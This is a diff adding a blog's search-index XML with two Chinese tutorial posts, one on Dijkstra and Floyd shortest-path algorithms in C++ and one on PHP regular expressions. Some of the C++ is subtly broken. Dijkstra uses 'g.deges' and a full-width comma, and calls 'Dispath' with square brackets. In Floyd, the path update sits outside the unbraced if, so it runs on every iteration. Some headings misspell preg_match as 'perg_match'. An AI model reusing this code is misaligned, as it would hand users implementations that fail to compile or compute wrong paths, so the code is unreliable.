@@ -1,0 +1,1267 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Dijkstra算法与Floyd算法</title>
+    <url>/2021/05/03/Dijkstra%E7%AE%97%E6%B3%95%E4%B8%8EFloyd%E7%AE%97%E6%B3%95/</url>
+    <content><![CDATA[<h2 id="Dijkstra算法"><a href="#Dijkstra算法" class="headerlink" title="Dijkstra算法"></a>Dijkstra算法</h2><p>Dijkstra算法用于求一个顶点到其余各顶点的最短路径（给定一个带权有向图<code>G</code>与源点<code>v</code>，求从<code>v</code>到<code>G</code>中其他顶点的最短路径，并限定各边上的权值大于或等于0）</p>
+<p>该算法的基本思路为：</p>
+<p>将图中顶点集合分为两组：</p>
+<p>第一组为已求出最短路径的顶点集合（用<code>S</code>表示，初始时<code>S</code>中只有一个源点，以后每求得一条<code>v</code>到<code>u</code>的最短路径，就将<code>u</code>加入到集合中）</p>
+<p>第二组为其余为求出最短路径的顶点集合（用<code>U</code>表示）</p>
+<p>如下图：</p>
+<p><img src="https://i.loli.net/2021/05/03/ov5HJp7eLVyrmWU.png" alt="image-20210503191500867"></p>
+<p>其算法步骤为：</p>
+<p>（1）初始化：令<code>S</code>只包含源点即<code>S</code>=<code>&#123;v&#125;</code>，<code>v</code>的最短路径为0，<code>U</code>包含除<code>v</code>外的其他顶点，<code>U</code>中顶点<code>i</code>距离为边上的权值（如果<code>v</code>与<code>i</code>之间有边<code>&lt;v,i&gt;</code>）或∞</p>
+<p><img src="https://i.loli.net/2021/05/03/A9Fq2JMvB57RUej.png" alt="image-20210503192426700"></p>
+<p>（2）从<code>U</code>中选取一个距离<code>v</code>最小的顶点<code>u</code>，把<code>u</code>加入到<code>S</code>中（该选定的距离就是<code>v</code>到<code>u</code>的最短路径长度）</p>
+<p><img src="https://i.loli.net/2021/05/03/jrpxogbet6Fv1MO.png" alt="image-20210503192434471"></p>
+<p>（3）以<code>u</code>为新考虑的中间点，修改<code>U</code>中各顶点<code>j</code>的最短路径长度：若从源点<code>v</code>到顶点<code>j</code>的最短路径长度（经过顶点<code>u</code>）比原来最短路径长度（不经过顶点<code>u</code>）短，则修改顶点j的最短路径长度</p>
+<p><img src="https://i.loli.net/2021/05/03/tgmMK4Oz3w5A72n.png" alt="image-20210503192654686"></p>
+<p>（4）重复步骤（2）和（3）直到所有顶点都包含在<code>S</code>中</p>
+<p><em>一开始的时候，可以认为只有与<code>v</code>相邻的顶点有路径，其余顶点没有路径，所以当前与<code>v</code>相邻的顶点的路径便是这些顶点的最短路径，但是</em> <strong>其中唯一确定以后不会改变的是那个跟<code>v</code>相邻的路径最短的顶点<code>u</code></strong> <em>，因为不可能再找到另一条<code>u</code>到<code>v</code>的路径比这条直接相连的路径更短（可以用反证法辅助证明）</em></p>
+<p><em>因为可以确定以后不会改变，所以将<code>u</code>加入，这时候对剩下的结点到<code>v</code>的路径进行分析，剩下的结点中，可以选择原有的到达<code>v</code>的方式，也可以选择经过<code>u</code>到达<code>v</code>的方式（以上两种方式下无法到达<code>v</code>的结点还是暂且默认距离为∞），两种方式比较，得到每个剩下顶点到<code>v</code>的路径，选择其中路径最短的那一个顶点（我们这里可以称之为<code>u&#39;</code>），<code>u&#39;</code>到<code>v</code>的路径便是最短路径，在以后问题的分析过程中也不会改变，所以也将其加入</em></p>
+<p><em>以此类推，可以得到所有顶点到<code>v</code>的最短路径</em></p>
+<p>在设计算法的过程中我们需要解决以下两个问题：</p>
+<p><strong>（1）如何存放最短路径长度？</strong></p>
+<p>使用一个一维数组<code>dist[j]</code>来存储，源点<code>v</code>默认，<code>dist[j]</code>表示源点到顶点<code>j</code>的最短路径长度</p>
+<p><strong>（2）如何存放最短路径？</strong></p>
+<p>可以使用一维数组path来进行保存，<code>path[j]</code>表示从源点<code>v</code>到<code>j</code>的最短路径中<code>j</code>的前一个顶点</p>
+<p><img src="https://i.loli.net/2021/05/03/z8rX4CWv6IH9Awt.png" alt="image-20210503200311587"></p>
+<p>具体算法实现：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dijkstra</span><span class="params">(MatGraph g，<span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> dist[MAXV],path[MAXV];</span><br><span class="line">    <span class="keyword">bool</span> in_S[MAXV]=&#123;<span class="literal">false</span>&#125;; <span class="comment">//用来判定点是否在S中</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;g.n;i++)&#123; </span><br><span class="line">        dist[i]=g.edges[v][i]; <span class="comment">//将距离数组初始化</span></span><br><span class="line">        <span class="keyword">if</span>(g.edges[v][i]&lt;INF) <span class="comment">//将路径数组初始化</span></span><br><span class="line">            path[i]=v; <span class="comment">//顶点v到i有边时</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            path[i]=<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    in_S[v]=<span class="literal">true</span>; <span class="comment">//将源点v放进S中</span></span><br><span class="line">    <span class="keyword">int</span> mindis; <span class="comment">//最短距离</span></span><br><span class="line">    <span class="keyword">int</span> u; <span class="comment">//最小长度顶点u</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;g.n;i++)&#123;</span><br><span class="line">        mindis=INF; <span class="comment">//将最短距离预设为∞</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;g.n;j++)</span><br><span class="line">            <span class="keyword">if</span>(in_S[j]==<span class="literal">false</span> &amp;&amp; dist[j]&lt;mindis)&#123; <span class="comment">//找最小路径长度顶点u</span></span><br><span class="line">                u=j;</span><br><span class="line">                mindis=dist[j];</span><br><span class="line">            &#125;</span><br><span class="line">       	in_S[u]=<span class="literal">true</span>; <span class="comment">//将顶点u加入到s中</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;g.n;j++) <span class="comment">//修改不在s中的顶点的距离</span></span><br><span class="line">			<span class="keyword">if</span>(in_S[j]==<span class="literal">false</span>)</span><br><span class="line">                <span class="keyword">if</span>(g.deges[u][j]&lt;INF &amp;&amp; dist[u]+g.deges[u][j]&lt;dist[j])&#123; <span class="comment">//如果某个结点经过u到达v的路径长度比原有长度更短</span></span><br><span class="line">                    dist[j]=dist[u]+g.deges[u][j];</span><br><span class="line">                    path[j]=u;</span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Dispath[dist,path,in_S,g.n,v]; <span class="comment">//输出最短路径    </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><em>狄克斯特拉算法的时间复杂度为O(n²)</em></p>
+<h2 id="Floyd算法"><a href="#Floyd算法" class="headerlink" title="Floyd算法"></a>Floyd算法</h2><p>Floyd算法用于计算对于一个各边权值均大于零的有向图，对每一对顶点<code>i</code>≠<code>j</code>，求出顶点<code>i</code>与顶点<code>j</code>之间的最短路径和最短路径长度</p>
+<p>该算法的思路实际上是一种迭代（递归）思路：</p>
+<p>假设有向图<code>G</code>=<code>(V,E)</code>采用邻接矩阵存储。设置一个二维数组A用于存放当前顶点之间的最短路径长度，分量<code>A[i][j]</code>表示当前顶点<code>i</code>到<code>j</code>的最短路径长度</p>
+<p>这时引入<br>$$<br>A_x[i][j]<br>$$<br>的概念，表示考虑能够经过0~<code>x</code>号的顶点的情况下，图中的顶点<code>i</code>与<code>j</code>的最短路径长度，这里的“经过”指的是，以<code>i</code>作为起点<code>j</code>作为终点，之间的路径可以包括0~<code>x</code>号顶点</p>
+<p>当<code>x</code>=0，意思是<code>i</code>到<code>j</code>之间不能经过任何顶点，所以此时的最短路径便是只考虑直接相连时的路径（不直接相连的话设置为∞）</p>
+<p>对于该算法，实际上我们需要解决2个问题：</p>
+<p><strong>（1）如何存储最短路径长度？</strong></p>
+<p>使用二维数组<code>A</code>存储最短长度</p>
+<p><strong>（2）如何存放最短路径？</strong></p>
+<p>使用二维数组<code>path</code>来存放最短路径：</p>
+<p>$$<br>path_x[i][j]<br>$$<br>表示考虑能经过0~<code>x</code>号顶点的情况下，<code>i</code>到<code>j</code>的最短路径的前一个顶点编号</p>
+<p><em>（如果没有路径则<code>A[i][j]</code>=∞，<code>path[i][j]</code>=-1）</em></p>
+<p>接下来考虑当多处理了一个顶点（即将能够经过的顶点多了一个）之后，对所有顶点路径的修正：</p>
+<p><strong>（1）对<code>A[i][j]</code>的修正</strong><br>$$<br>①A_{-1}[i][j]=g.edges[i][j]<br>$$</p>
+<p>$$<br>②A_k[i][j]=min{A_{k-1}[i][j], A_{k-1}[i][k]+A_{k-1}[k][j]}<br>$$</p>
+<p>即如果将顶点<code>k</code>设置为可经过，则这时候<code>i</code>到<code>j</code>会多一条通路，即<code>i</code>到<code>k</code>到<code>j</code>，将其与<code>k</code>不可经过时的进行对比，小者便是最终的小者</p>
+<p><strong>（2）对<code>path[i][j]</code>的修正</strong></p>
+<p>在<code>k</code>设置为可经过之后，<code>i</code>到<code>j</code>会多一条通路，即<code>i</code>到<code>k</code>到<code>j</code>，如果新的通路更短，则：<br>$$<br>path_k[i][j]=path_{k-1}[k][j]<br>$$<br><img src="https://i.loli.net/2021/05/03/dpZlVsOaR4Bubw9.png" alt="image-20210503215908635"></p>
+<p>如上图所示，如果最短通路发生变化，在新的通路中，<code>i</code>到<code>j</code>的最短路径的前一个顶点编号便是原来的<code>k</code>到<code>j</code>的路径的前一个顶点编号<code>b</code></p>
+<p>弗洛伊德算法的具体实现如下：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Floyd</span><span class="params">(MatGraph g)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> A[MAXVEX][MAXVEX];<span class="comment">//建立A数组</span></span><br><span class="line">	<span class="keyword">int</span> path[MAXVEX][MAXVEX];<span class="comment">//建立path数组</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;g.n;i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;g.n;j++)&#123;</span><br><span class="line">            A[i][j]=g.edges[i][j]; <span class="comment">//初始化A[][]数组</span></span><br><span class="line">            <span class="keyword">if</span>(i!=j &amp;&amp; g.edges[i][j]&lt;INF) <span class="comment">//初始化path[][]数组</span></span><br><span class="line">                path[i][j]=i;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                path[i][j]=<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;g.n;k++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;g.n;i++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;g.n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(A[i][j]&gt;A[i][k]+A[k][j]) <span class="comment">//找到了更短路径</span></span><br><span class="line">                    A[i][j]=A[i][k]+A[k][j];	<span class="comment">//修改路径长度</span></span><br><span class="line">                	path[i][j]=path[k][j]; 	<span class="comment">//修改最短路径为经过顶点k</span></span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><em>弗洛伊德算法的时间复杂度为O(n³)</em></p>
+]]></content>
+      <categories>
+        <category>算法</category>
+        <category>bug储藏室</category>
+      </categories>
+      <tags>
+        <tag>数据结构</tag>
+        <tag>算法</tag>
+        <tag>图</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP中的正则表达式</title>
+    <url>/2021/04/29/PHP%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
+    <content><![CDATA[<p><strong>在代码审计题中经常遇到正则表达式，以下是一些正则表达式的汇总</strong></p>
+<h2 id="正则匹配函数"><a href="#正则匹配函数" class="headerlink" title="正则匹配函数"></a>正则匹配函数</h2><h3 id="perg-match-all"><a href="#perg-match-all" class="headerlink" title="perg_match_all"></a><code>perg_match_all</code></h3><p>在指定的字符串中使用指定的正则表达式所定义的规则来进行正则匹配，如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/test/&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;abctestabcdtest&#x27;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中$pattern为正则表达式，$str为将被用于匹配的字符串，而$arr为用于存储匹配后的结果的数组（可有可无），输出结果：</p>
+<p><img src="https://i.loli.net/2020/11/03/4LBu3NMlJnpRGVa.png" alt="image-20201103193956251"></p>
+<p>其中输出的$arr将是一个二维数组，其中存放的是匹配到的部分。</p>
+<h3 id="perg-match"><a href="#perg-match" class="headerlink" title="perg_match"></a><code>perg_match</code></h3><p>与前一个不同的是，前者将会一直往下匹配，匹配字符串中所有符合正则表达式的子串</p>
+<p>而后者只进行一次匹配，在第一次匹配之后将会停止搜索，匹配次数为0或者1</p>
+<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>正则表达式<strong>描述了一类字符串的特征</strong>，通过这个特征与特定的函数（preg_函数）配合，对其他的字符串进行匹配、查找、替换以及分割操作。</p>
+<p>这类字符串是由一个或多个：（1）普通字符（a-z A-Z 0-9 双引号 单引号 它们没有特殊的含义）（2）元字符（具有特殊的含义） 组成。</p>
+<p>一般使用正斜线”/“来作为<strong>定界符</strong>，其实除了字母、数字和反斜线之外的字符都可以被作为定界符，比如# ! {} | 都可以用来充当定界符，定界符用来放在正则表达式的起始位置，前后一致。</p>
+<h3 id="d"><a href="#d" class="headerlink" title="\d"></a><code>\d</code></h3><p>表示匹配0-9的任意<strong>一个</strong>普通字符，如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/t\dst/&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;t2sttesttstt6st&#x27;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：<img src="https://i.loli.net/2020/11/03/p7izaQuo18twA4K.png" alt="image-20201103194859097"></p>
+<h3 id="D"><a href="#D" class="headerlink" title="\D"></a><code>\D</code></h3><p>表示匹配任意<strong>一个</strong>除了十进制数字以外的字符，如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/t\Dst/&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;t2sttesttstt6st&#x27;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：<img src="https://i.loli.net/2020/11/03/odxA6tSCscIEX2w.png" alt="image-20201103195139429"></p>
+<h3 id="s"><a href="#s" class="headerlink" title="\s"></a><code>\s</code></h3><p>表示匹配任意<strong>一个</strong>空白字符，比如换页符、换行符、回车符、制表符、垂直制表符，如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/s\sn/&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;as\nnas n&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：<img src="https://i.loli.net/2020/11/03/qPxyp5F8zAaliED.png" alt="image-20201103200110151"></p>
+<p>其中如果想要如换行符 \n 的转义字符被解析，需要使用双引号</p>
+<h3 id="S"><a href="#S" class="headerlink" title="\S"></a><code>\S</code></h3><p>同理，表示匹配任意一个除空白字符以外的字符</p>
+<h3 id="w"><a href="#w" class="headerlink" title="\w"></a><code>\w</code></h3><p>匹配任意一个数字字母或者下划线，如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/a\wb/&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;a0bacba_b&#x27;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：<img src="https://i.loli.net/2020/11/03/unX4ghFM2GwDO7y.png" alt="image-20201103200518465"></p>
+<h3 id="W"><a href="#W" class="headerlink" title="\W"></a><code>\W</code></h3><p>同理，匹配任意一个除数字字母或者加下划线之外的字符</p>
+<h3 id=""><a href="#" class="headerlink" title="."></a><code>.</code></h3><p>匹配除换行符之外的任意一个字符，如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/a.b/&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;acba\nb&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：<img src="https://i.loli.net/2020/11/03/OybzqQDHMZdv5xX.png" alt="image-20201103200906676"></p>
+<p>如果需要匹配字符”.”，就需要使用转义符</p>
+<h3 id="-1"><a href="#-1" class="headerlink" title="*"></a><code>*</code></h3><p>匹配0次、或1次、或多次其前面的字符，即：放在*前面的字符可以出现0次、1次或者多次，如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/a*ed/&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;1edaedaaaaed&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：<img src="https://i.loli.net/2020/11/03/dJFhqMVPk4O2pcB.png" alt="image-20201103201510289"></p>
+<h3 id="-2"><a href="#-2" class="headerlink" title="+"></a><code>+</code></h3><p>匹配1次或者多次其前面的字符，跟 * 很像，区别在于不能为0次，如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/a+ed/&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;1edaedaaaaed&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：<img src="https://i.loli.net/2020/11/03/V7kt3LCWBrQaPZo.png" alt="image-20201103201702239"></p>
+<h3 id="-3"><a href="#-3" class="headerlink" title="?"></a><code>?</code></h3><p>匹配0次或1次其前面的字符，跟 * 很像，区别在于不能为多次，如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/a?ed/&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;1edaedaaaaed&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：<img src="https://i.loli.net/2020/11/03/ZEWG7CpcldoR3f2.png" alt="image-20201103202034848"></p>
+<h3 id="n"><a href="#n" class="headerlink" title="{n}"></a><code>&#123;n&#125;</code></h3><p>表示其前面的字符恰好出现n次，如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/as&#123;2&#125;d/&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;asdassdasssd&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：<img src="https://i.loli.net/2020/11/03/yUGpvHAOls5qQjV.png" alt="image-20201103202601173"></p>
+<h3 id="n-1"><a href="#n-1" class="headerlink" title="{n,}"></a><code>&#123;n,&#125;</code></h3><p>表示其前面的字符出现不少于n次，如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/as&#123;2,&#125;d/&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;asdassdasssd&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：<img src="https://i.loli.net/2020/11/03/k9OZiHCwj5GTA12.png" alt="image-20201103202923573"></p>
+<h3 id="n-m"><a href="#n-m" class="headerlink" title="{n,m}"></a><code>&#123;n,m&#125;</code></h3><p>表示其前面的字符出现至少n次，至多m次，如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/as&#123;2,3&#125;d/&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;asdassdasssdassssd&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：<img src="https://i.loli.net/2020/11/03/7ofLxiTa6MH43IR.png" alt="image-20201103203117585"></p>
+<h3 id="贪婪匹配"><a href="#贪婪匹配" class="headerlink" title="贪婪匹配"></a>贪婪匹配</h3><p><code>.</code> 与 <code>*</code> 配合使用，默认情况下是贪婪匹配，如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/a.*b/&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;a123b123b123b&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：<img src="https://i.loli.net/2020/11/03/o9SNrk7PyWCZBIu.png" alt="image-20201103204035685"></p>
+<p>如结果所示，将被用于匹配的字符串中有很多个b，由于贪婪匹配原则，将会匹配尽可能长的字符串。</p>
+<h3 id="懒惰匹配"><a href="#懒惰匹配" class="headerlink" title="懒惰匹配"></a>懒惰匹配</h3><p>如果需要避免触发贪婪匹配，可以在 <code>.*</code> 的后面加上一个 <code>?</code> 这样就变为懒惰匹配，如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/a.*?b/&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;a123ba123ba123b&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：<img src="https://i.loli.net/2020/11/03/43w71WEcRx8UaPH.png"></p>
+<p>这样在a和b之间的字符将尽可能地少</p>
+<h3 id="或-A"><a href="#或-A" class="headerlink" title="^或\A"></a><code>^</code>或<code>\A</code></h3><p><code>^</code>或<code>\A</code>匹配字符串的开始位置，如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/^ab/&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;ab123&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：<img src="https://i.loli.net/2020/11/03/mG3oUORtfWEdkAK.png" alt="image-20201103210833788"></p>
+<p>意思就是，被匹配的字符串中要有ab并且一定要在开头</p>
+<h3 id="或-Z"><a href="#或-Z" class="headerlink" title="$或\Z"></a><code>$</code>或<code>\Z</code></h3><p><code>$</code>或<code>\Z</code>匹配字符串的结尾位置，如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/ab$/&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;123ab&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：<img src="https://i.loli.net/2020/11/03/WJ6rbwSxL3qERae.png" alt="image-20201103211947429"></p>
+<p>意思就是，被匹配的字符串中要有ab并且一定要在结尾</p>
+<h3 id="-4"><a href="#-4" class="headerlink" title="|"></a><code>|</code></h3><p>表示或，如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/123|abc/&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;123abc&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：<img src="https://i.loli.net/2020/11/04/BlZWni9u5UNfgEA.png" alt="image-20201104230546575"></p>
+<h3 id="-5"><a href="#-5" class="headerlink" title="[]"></a><code>[]</code></h3><p>表示匹配方括号中的任意一个字符，如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/h[aeiou]p/&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;hcphaphup&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：<img src="https://i.loli.net/2020/11/04/GBiPfcluIt5KqJC.png" alt="image-20201104231005577"></p>
+<h3 id="-6"><a href="#-6" class="headerlink" title="[^]"></a><code>[^]</code></h3><p>表示匹配除方括号中的字符以外的任意字符，如：</p>
